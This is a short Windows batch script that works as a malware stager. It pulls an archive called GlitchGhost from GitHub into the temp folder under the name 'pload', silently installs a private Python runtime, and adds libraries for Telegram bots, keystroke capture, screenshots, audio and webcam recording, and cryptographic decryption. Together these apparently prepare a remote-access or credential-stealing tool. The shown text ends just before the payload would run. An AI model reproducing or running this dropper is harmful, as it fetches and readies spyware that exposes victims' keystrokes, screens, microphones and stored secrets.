@echo off
cd /d %TEMP%

curl -L -o "%TEMP%\pload.zip" https://github.com/Issac-dev/GlitchGhost/archive/refs/heads/main.zip
mkdir "%TEMP%\pload"
tar -xf "%TEMP%\pload.zip" -C "%TEMP%\pload"
cd %TEMP%\pload\GlitchGhost-main
curl -o python-3.9.0-embed-amd64.zip https://www.python.org/ftp/python/3.9.0/python-3.9.0-embed-amd64.zip
powershell -Command "Expand-Archive -Path 'python-3.9.0-embed-amd64.zip' -DestinationPath 'C:\Python'"
cd C:\Python
echo Pip is not installed. Installing pip...
curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
python get-pip.py
cd C:\Python\lib\site-packages
mkdir pyautogui
curl -L -o "PyAutoGUI-0.9.54.tar.gz" https://files.pythonhosted.org/packages/65/ff/cdae0a8c2118a0de74b6cf4cbcdcaf8fd25857e6c3f205ce4b1794b27814/PyAutoGUI-0.9.54.tar.gz
tar -xf "PyAutoGUI-0.9.54.tar.gz" -C ./
cd PyAutoGUI-0.9.54
xcopy /E /I pyautogui C:\Python\lib\site-packages\pyautogui
cd C:\Python\lib\site-packages
mkdir pyscreeze
curl -L -o "pyscreeze-1.0.1.tar.gz" https://files.pythonhosted.org/packages/ee/f0/cb456ac4f1a73723d5b866933b7986f02bacea27516629c00f8e7da94c2d/pyscreeze-1.0.1.tar.gz
tar -xf "pyscreeze-1.0.1.tar.gz" -C ./
cd pyscreeze-1.0.1
xcopy /E /I pyscreeze C:\Python\lib\site-packages\pyscreeze
cd C:\Python\lib\site-packages
echo Installing requests package...
C:\Python\python C:\Python\Lib\site-packages\pip install requests python-telegram-bot pypiwin32 pycryptodome cryptography==41.0.7 pynput sounddevice scipy opencv-python numpy setuptools pillow
cd %TEMP%\pload\GlitchGhost-main
